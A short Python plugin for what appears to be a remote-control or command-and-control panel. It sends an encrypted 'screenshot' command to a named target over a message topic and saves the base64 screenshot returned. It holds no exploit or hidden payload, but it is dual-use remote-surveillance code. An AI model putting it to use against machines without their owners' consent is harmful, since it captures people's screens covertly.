# plugins/screenshot.py
from .base_plugin import BasePlugin
import ujson as json
import base64
import os

class ScreenshotPlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Take Screenshot"
        self.menu_action = self.name
        self.priority = 50

    def execute(self, target):
        # Create downloads directory if it doesn't exist
        downloads_dir = os.path.join(os.getcwd(), "downloads")
        if not os.path.exists(downloads_dir):
            os.makedirs(downloads_dir)

        # Send screenshot command
        cmd = {'type': 'command', 'target': target, 'action': 'screenshot'}
        cmd_json = json.dumps(cmd)
        encrypted_cmd = self.parent.encrypt_message(cmd_json)
        self.parent.client.publish(self.parent.topic, encrypted_cmd)
        self.parent.log_area.append(f"Sent screenshot command to {target}")

    def handle_response(self, data):
        if data.get('type') == 'screenshot_response':
            file_name = data.get('message', 'screenshot.png')
            file_data = data.get('file_data', '')
            try:
                decoded_data = base64.b64decode(file_data)
                file_path = os.path.join("downloads", file_name)
                with open(file_path, 'wb') as f:
                    f.write(decoded_data)
                self.parent.log_area.append(f"Saved screenshot to {file_path}")
            except Exception as e:
                self.parent.log_area.append(f"Error saving screenshot: {e}")